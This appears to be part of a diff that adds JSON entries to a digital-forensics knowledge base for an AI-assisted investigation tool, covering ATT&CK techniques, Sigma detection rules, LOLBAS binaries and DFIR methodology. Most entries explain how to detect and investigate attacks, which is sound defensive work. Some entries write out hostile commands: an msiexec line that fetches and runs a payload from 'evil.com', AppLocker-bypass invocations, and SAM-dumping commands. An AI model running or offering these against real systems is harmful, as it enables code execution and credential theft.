+  {"id": "SRL2018-CONTEXT", "source": "casefile_reference", "title": "SRL-2018 Case Context (CRIMSON OSPREY)", "content": "SANS FOR508 SRL-2018 case context for CaseFile investigation. Threat actor: External attacker with internal foothold. Initial access: Unknown (not in RD01 evidence). Key findings on BASE-RD-01: msadvapi2_64.exe and msadvapi2_32.exe fake Microsoft services (persistence), CSRSS.EXE masquerading in C:\\Windows\\Temp\\Perfmon (T1036.005), procdump.exe in Dashlane directory (T1003.001 credential dumping, linked to tdungan account), C2 beaconing 172.16.6.12:445 NTLM every 12 minutes (14 connections in memory), timestomping on subject_srv.exe (SI created 2018-01-15, FN created 2018-03-22), sdelete64 and wevtutil anti-forensics. Hex-named Cobalt Strike payload in Amcache. Cross-host IOCs propagated to DC: 19 IOCs including 2 IPs, 14 executables, 2 hashes.", "tags": ["casefile_reference", "srl2018", "crimson_osprey", "investigation_context"]},
+  {"id": "GUIDE-CHAINOFCUSTODY", "source": "methodology", "title": "Chain of Custody Documentation", "content": "Forensic chain of custody ensures evidence integrity in legal proceedings. CaseFile chain of custody elements: 1) SHA-256 hash of source image (source.sha256, written by ingest.sh). 2) All analysis on copies in analysis/ (evidence/ directory is read-only). 3) Every tool invocation logged to audit/mcp.jsonl with timestamp, examiner, tool, return code. 4) Findings require human approval via casefile-approve (password-protected, TTY-required). 5) Approval records written to approvals.jsonl with SHA-256 content hash at approval time. 6) Evidence deny rules (.claude/settings.json) prevent AI from modifying evidence or audit records.", "tags": ["methodology", "chain_of_custody", "forensics", "casefile_reference"]},
+  {"id": "SIGMA-SCHEDULED-TASK", "source": "sigma", "title": "Sigma: Suspicious Scheduled Task", "content": "Sigma rules for suspicious scheduled task creation. High confidence: task action contains Base64-encoded commands, task action path in Temp/AppData/Users, task principal runs as SYSTEM for non-administrative task name, task created by non-admin account. Medium confidence: task name contains random characters, task description empty for system-looking task name, task trigger on user logon for suspicious executable. Detection via Event 4698 (task created, Security log) and C:\\Windows\\System32\\Tasks XML file contents.", "tags": ["sigma", "scheduled_task", "persistence", "detection", "windows", "T1053.005"]},
+  {"id": "SIGMA-WMI-PERSISTENCE", "source": "sigma", "title": "Sigma: WMI Persistence Detection", "content": "Sigma rules for WMI event subscription persistence. Detection: Event ID 5861 in Microsoft-Windows-WMI-Activity/Operational showing new FilterToConsumerBinding, WMI consumer pointing to script files or executables in user paths, EventFilter with QueryLanguage=WQL and Query containing unusual conditions. High confidence: CommandLineEventConsumer running scripts from Temp, ActiveScriptEventConsumer with VBScript/JScript, PermanentSubscription bound to LogonEvent. WMI repository forensic analysis required for complete picture.", "tags": ["sigma", "wmi", "persistence", "detection", "windows", "T1546.003"]},
+  {"id": "DECODE-PATTERNS", "source": "methodology", "title": "Encoded Command Decoding Guide", "content": "Common encoding patterns used by attackers and how to decode: PowerShell -EncodedCommand: Base64-decode the argument, then UTF-16LE decode (common gotcha: must decode as UTF-16LE not UTF-8). certutil -encode/-decode: uses MIME Base64. Environment variable obfuscation: %COMSPEC% = cmd.exe, %SYSTEMROOT% = C:\\Windows, nested expansion via !variable!. Caret escaping: c^md = cmd (carets removed). String substitution: set a=pow&&set b=er&&call %a%%b%shell. XOR encoding common in shellcode loaders. Tool: CyberChef for quick decoding.", "tags": ["methodology", "obfuscation", "decoding", "windows", "powershell"]},
+  {"id": "ATT-T1003.002", "source": "mitre_attack", "technique_id": "T1003.002", "title": "SAM Database Dumping", "content": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database. The SAM stores local account hashes. Extraction methods: reg save HKLM\\SAM, Volume Shadow Copy, Mimikatz lsadump::sam. Detection: Reg.exe with SAM hive in command line (Event 4688), access to C:\\Windows\\System32\\config\\SAM, Mimikatz in Prefetch/Amcache, SYSTEM hive access alongside SAM (both needed for decryption). SAM is locked while Windows is running -- attackers use shadow copy or offline access.", "tags": ["credential_access", "sam", "windows", "T1003.002"]},
+  {"id": "ATT-T1003.003", "source": "mitre_attack", "technique_id": "T1003.003", "title": "NTDS Database Dumping", "content": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information. Methods: ntdsutil IFM (Install from Media), Volume Shadow Copy of NTDS.dit, DCSync (replication protocol). Detection: ntdsutil.exe in Prefetch on domain controller, Volume Shadow Copy access to NTDS.dit path, Event 4662 with DS-Replication-Get-Changes rights (DCSync). NTDS.dit copy requires SYSTEM hive for decryption -- look for both files being accessed/copied together.", "tags": ["credential_access", "ntds", "active_directory", "windows", "T1003.003"]},
+  {"id": "GUIDE-VOLATILE-DATA", "source": "methodology", "title": "Volatile Data Priority in Investigation", "content": "Volatile data order of priority (most volatile first): CPU registers and cache (not capturable post-acquisition), RAM/memory image (process state, network connections, encryption keys), network connections (visible in memory image via netscan), running processes (pslist/psscan), open files and handles, disk cache, temporary files (Temp directories), swap/pagefile. Memory acquisition should occur before disk imaging when possible. CaseFile parse_memory() leverages Volatility3 on already-acquired memory image. Key: netscan only shows connections at acquisition time.", "tags": ["methodology", "volatile_data", "memory", "forensics", "triage"]},
+  {"id": "SIGMA-PASS-THE-HASH", "source": "sigma", "title": "Sigma: Pass-the-Hash Detection", "content": "Sigma rule for pass-the-hash detection on Windows. Detection: Event 4624 where LogonType=3 AND AuthenticationPackageName=NTLM AND WorkstationName is empty or mismatched AND IpAddress is an internal IP (not ANONYMOUS LOGON). High confidence: Source IP connects to multiple hosts within short timeframe using same account via NTLM (not Kerberos -- Kerberos requires ticket, PtH bypasses this). Also: 4648 events preceding 4624 type 3 from same source indicate explicit credential supply.", "tags": ["sigma", "pass_the_hash", "lateral_movement", "detection", "windows", "4624"]},
+  {"id": "ATT-T1558.003", "source": "mitre_attack", "technique_id": "T1558.003", "title": "Kerberoasting", "content": "Kerberoasting requests Kerberos service tickets for service accounts and cracks them offline. The tickets are encrypted with the service account's password hash. Any authenticated domain user can request service tickets. Detection: Multiple Event 4769 from single source in short timeframe (automated enumeration), RC4 encryption requested (0x17) for AES-capable accounts (attackers prefer RC4 -- easier to crack), service accounts with SPNs in sensitive groups, unusual hours for ticket requests. Prevention: Use AES256 only, long random passwords for service accounts, Managed Service Accounts.", "tags": ["credential_access", "kerberoasting", "kerberos", "windows", "T1558.003", "4769"]},
+  {"id": "SIGMA-DEFENSE-EVASION", "source": "sigma", "title": "Sigma: Defense Evasion Detection Bundle", "content": "Bundle of defense evasion Sigma rules: UAC bypass (fodhelper.exe spawning commands, eventvwr.exe registry manipulation, sdclt.exe /kickoffelev), AMSI bypass (amsiutils SetResult 0 pattern in script blocks), ETW tampering (EtwEventWrite patching in memory), CLM bypass (PowerShell LanguageMode manipulation), AppLocker bypass (regsvr32, mshta, wmic, InstallUtil), WDAC bypass (deprecated DLL execution). All detectable via Event 4688 command lines and PowerShell script block logging (Event 4104).", "tags": ["sigma", "defense_evasion", "detection", "windows", "uac_bypass"]},
+  {"id": "GUIDE-REPORT-WRITING", "source": "methodology", "title": "Forensic Report Writing Standards", "content": "Forensic reports must be reproducible and legally defensible. Standards: 1) Findings stated as observed facts, not opinions (observed: CSRSS.EXE at Temp path; conclusion: masquerading). 2) Every finding cites specific tool, artifact, and timestamp. 3) Confidence level explicit (CONFIRMED=multi-source, INFERRED=single-source). 4) Anti-forensics actions documented as findings themselves. 5) Timeline gaps noted and bounded. 6) Chain of custody preserved (SHA-256 of source, examiner identity, tool versions). CaseFile record_finding() enforces evidence_quotes for CONFIRMED findings, ensuring every claim has tool attribution.", "tags": ["methodology", "report_writing", "forensics", "legal"]},
+  {"id": "WIN-LOLBAS-INSTALLUTIL", "source": "lolbas", "title": "LOLBAS: InstallUtil.exe", "content": "InstallUtil.exe is a .NET framework utility used to install and uninstall .NET components. Malicious use: execute arbitrary .NET code bypassing AppLocker (uninstaller code runs without installation context). Method: installutil /logfile= /LogToConsole=false /U [malicious.exe]. Detection: InstallUtil.exe in Prefetch with unusual arguments or from non-admin context, Event 4688 showing InstallUtil with /U flag and unusual assembly path, Amcache showing .NET assemblies in user paths. Legitimate use: software installation/removal by admins.", "tags": ["lolbas", "installutil", "execution", "applocker_bypass", "windows"]},
+  {"id": "WIN-LOLBAS-ODBCCONF", "source": "lolbas", "title": "LOLBAS: odbcconf.exe", "content": "odbcconf.exe configures ODBC drivers and can execute DLL files. Malicious use: odbcconf /a {REGSVR [malicious.dll]} to execute arbitrary DLLs. AppLocker bypass via trusted Microsoft binary. Detection: odbcconf.exe in Prefetch, Event 4688 with /a {REGSVR flag and unusual DLL path, DLL creation in Temp preceding odbcconf execution. Legitimate use: ODBC driver configuration by DBAs.", "tags": ["lolbas", "odbcconf", "execution", "applocker_bypass", "windows"]},
+  {"id": "WIN-LOLBAS-MSIEXEC", "source": "lolbas", "title": "LOLBAS: msiexec.exe", "content": "msiexec.exe installs, modifies, and performs operations on MSI packages. Malicious use: execute remote MSI (msiexec /i http://evil.com/payload.msi /quiet), load malicious DLL via transform, extract embedded payloads from MSI. Detection: msiexec with /i and URL, msiexec making network connections, MSI files created in Temp, Event 4688 showing msiexec with remote path. Legitimate use: software deployment via group policy and management systems.", "tags": ["lolbas", "msiexec", "execution", "detection", "windows"]},
+  {"id": "INCIDENT-RESPONSE-PHASES", "source": "methodology", "title": "Incident Response Phase Checklist", "content": "Incident response phases and CaseFile support: 1) Preparation (pre-incident): tool readiness, baseline documentation. 2) Identification: initial triage, IOC identification -- CaseFile parse_* tools for rapid artifact analysis. 3) Containment: scope determination -- CaseFile IOC propagation (propagate_iocs.py) for multi-host hunting. 4) Eradication: attacker tool/persistence removal -- CaseFile finding documentation as remediation guide. 5) Recovery: system restoration verification. 6) Lessons Learned: accurate incident timeline -- CaseFile timeline events and final report. CaseFile output: CONFIRMED findings drive containment scope, INFERRED findings drive further investigation.", "tags": ["methodology", "incident_response", "forensics", "casefile_reference"]},
+  {"id": "ATT-T1136.001", "source": "mitre_attack", "technique_id": "T1136.001", "title": "Create Local Account", "content": "Adversaries may create a local account to maintain access to victim systems. Detection: Event ID 4720 (local account created), 4722 (account enabled), 4728/4732/4756 (account added to privileged group). New accounts in SAM database visible via RECmd. Suspicious: accounts created outside normal IT hours, accounts immediately added to Administrators group, accounts with names mimicking system accounts (admin, administrator with lookalike characters). Also watch 4726 (account deleted) -- attackers may clean up created accounts.", "tags": ["persistence", "account_creation", "windows", "T1136.001", "4720"]},
+  {"id": "ATT-T1098", "source": "mitre_attack", "technique_id": "T1098", "title": "Account Manipulation", "content": "Adversaries may manipulate accounts to maintain access to victim systems. Techniques: adding accounts to privileged groups (4728/4732), modifying account permissions, resetting passwords (4723/4724), enabling disabled accounts (4722), modifying AD objects (4662 with write access). Detection: Unexpected modifications to privileged accounts or groups during non-change-window hours, modifications made by non-admin accounts, service account passwords reset (service accounts rarely need password changes), new accounts added to Domain Admins.", "tags": ["persistence", "account_manipulation", "windows", "T1098", "active_directory"]},
+  {"id": "GUIDE-LIVE-RESPONSE", "source": "methodology", "title": "Live Response Triage Order", "content": "Live response triage prioritizes volatile evidence: 1) Memory acquisition (WinPmem, DumpIt) before any other action. 2) Network connections (netstat -ano, Volatility netscan from memory image). 3) Running processes (tasklist /v, Volatility pslist+psscan). 4) Active network shares (net session, net use). 5) Logged-on users (query user, qwinsta). 6) Scheduled tasks (schtasks /query). 7) Services (sc query, Get-Service). 8) Autorun entries (autoruns -a). 9) Disk imaging. CaseFile parse_memory() covers steps 2-3 from acquired memory image. Always acquire memory first -- it changes every millisecond.", "tags": ["methodology", "live_response", "triage", "forensics", "windows"]},
+  {"id": "SIGMA-SUSPICIOUS-PARENT", "source": "sigma", "title": "Sigma: Suspicious Parent-Child Process Relationships", "content": "High-confidence suspicious parent-child relationships: Office (winword/excel/powerpoint/outlook) -> cmd/powershell/wscript/mshta/regsvr32. Browser (chrome/firefox/iexplore/msedge) -> cmd/powershell/mshta. Adobe Reader -> cmd/powershell. Java (java/javaw) -> cmd/powershell (common in exploitation). Web server (w3wp/httpd/nginx) -> cmd/powershell/sh. Script hosts (wscript/cscript) -> powershell/cmd. Medium confidence: svchost -> cmd (legitimate but worth checking), rundll32 -> powershell, msiexec -> powershell. Any of these chains visible in Event 4688 ParentProcessName field.", "tags": ["sigma", "parent_child", "detection", "windows", "process_relationship"]},
+  {"id": "ARTIFACT-SHADOW-COPIES", "source": "artifact_guide", "title": "Volume Shadow Copies Analysis", "content": "Volume Shadow Copies (VSS) provide point-in-time snapshots of NTFS volumes. Location: Available via vssadmin list shadows, accessible at \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[N]. Contents: Complete copy of volume at snapshot time, including system files, registry hives, NTDS.dit. Key forensic value: Recover deleted files, access registry from specific point in time (pre-attack baseline), compare file states between snapshots. Attackers delete shadow copies (vssadmin delete shadows) as anti-forensics. Absence of expected shadow copies is itself forensically significant.", "tags": ["artifact_guide", "shadow_copies", "vss", "windows", "recovery"]},
+  {"id": "WIN-LOGON-TYPES", "source": "windows_baseline", "title": "Windows Logon Type Reference", "content": "Windows logon type codes for Event ID 4624: Type 2 (Interactive) = direct keyboard logon. Type 3 (Network) = file shares, net use, PsExec first stage. Type 4 (Batch) = scheduled task. Type 5 (Service) = service startup. Type 7 (Unlock) = workstation unlock. Type 8 (NetworkCleartext) = IIS basic auth, network logon with cleartext password. Type 9 (NewCredentials) = runas /netonly, preserves local token but uses new creds for network. Type 10 (RemoteInteractive) = RDP. Type 11 (CachedInteractive) = domain logon without DC contact. Forensic value: Type 10 = RDP, Type 3+NTLM+IP = pass-the-hash, Type 2 for service account = suspicious.", "tags": ["windows_baseline", "logon_types", "event_logs", "windows", "4624"]},
+  {"id": "ATT-T1547.009", "source": "mitre_attack", "technique_id": "T1547.009", "title": "Shortcut Modification", "content": "Adversaries may create or edit shortcuts to run their tools for persistence. Methods: modify existing desktop shortcuts to also run malware, create new shortcuts in startup folder, modify LNK files to point to malicious files. Detection: LNK files in Startup folders (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp, C:\\Users\\[user]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup), LNK files with modified targets (LECmd analysis), MFT timestamps of recently created/modified LNK files.", "tags": ["persistence", "lnk", "shortcut", "windows", "T1547.009"]},
+  {"id": "SIGMA-NEW-USER", "source": "sigma", "title": "Sigma: Suspicious New User Account", "content": "Sigma rule for suspicious account creation. Detection: Event 4720 (account created) followed within 60 seconds by 4732 (added to local group). High confidence: account added to Administrators, Remote Desktop Users, or other privileged local groups immediately after creation. Account name matching patterns: admin[0-9]+, support[0-9]+, helpdesk, svc followed by random chars, names mimicking existing admin accounts with character substitution. Correlate with 4624 to identify who was logged on when account was created.", "tags": ["sigma", "user_creation", "persistence", "detection", "windows", "4720"]},
+  {"id": "GUIDE-DFIR-MINDSET", "source": "methodology", "title": "DFIR Investigation Mindset", "content": "Core DFIR investigation principles: 1) Evidence speaks; you interpret. State what the data shows, not what you think happened. 2) Absence of evidence is not evidence of absence. Missing logs = possible clearing. 3) Corroborate before concluding. Single-source findings are INFERRED, not CONFIRMED. 4) Timeline first. Build chronology before drawing conclusions. 5) Follow the evidence, not your hypothesis. If data contradicts theory, revise theory. 6) Anti-forensics are evidence. Deleted logs and timestomped files tell a story. 7) Document everything. If you didn't write it down, it didn't happen in court. CaseFile enforces these principles structurally via confidence levels, evidence quotes, and audit trails.", "tags": ["methodology", "dfir_mindset", "forensics", "investigation"]},
+  {"id": "ATT-T1059.005", "source": "mitre_attack", "technique_id": "T1059.005", "title": "Visual Basic", "content": "Adversaries may abuse Visual Basic (VB) for execution. VBS files run via wscript.exe or cscript.exe, VBA macros in Office documents run via Office applications. Detection: wscript.exe or cscript.exe spawning from Office or email client, .vbs files in Temp/Downloads/AppData, Event 4688 showing VBS execution, PowerShell spawning from VBS (common macro chain), Office applications spawning script hosts. VBA macro execution leaves Office process in Prefetch with macro-triggered child processes in Event 4688 parent-child chain.", "tags": ["execution", "vbscript", "windows", "T1059.005", "macro"]},
+  {"id": "ATT-T1059.007", "source": "mitre_attack", "technique_id": "T1059.007", "title": "JavaScript", "content": "Adversaries may abuse various implementations of JavaScript for execution. Windows: JScript via wscript.exe/cscript.exe, mshta executing JavaScript, rundll32 executing JavaScript via ActiveXObject. Detection: wscript.exe running .js files, mshta with JavaScript: URI scheme, rundll32 with javascript: in arguments, Event 4688 showing script host processes with .js files, browser processes spawning child processes. JavaScript-based stagers download and execute second-stage payloads.", "tags": ["execution", "javascript", "windows", "T1059.007", "jscript"]},
+  {"id": "DIGITAL-FORENSICS-STANDARDS", "source": "methodology", "title": "Forensic Standards and Legal Admissibility", "content": "Key forensic standards for legal admissibility: 1) Daubert standard (US): scientific testimony must be peer-reviewed, testable, and accepted by scientific community. 2) Authentication: evidence must be what it purports to be (SHA-256 hashes provide cryptographic authentication). 3) Best evidence rule: original or forensic copy with verified hash. 4) Chain of custody: unbroken documentation from collection to court. 5) Examiner qualifications: methodology must be reproducible by qualified peer. CaseFile provides: SHA-256 source hash, audit trail of every tool action, examiner identity in all records, reproducible methodology documented in dataset.md.", "tags": ["methodology", "legal", "forensics", "standards", "chain_of_custody"]}
+]
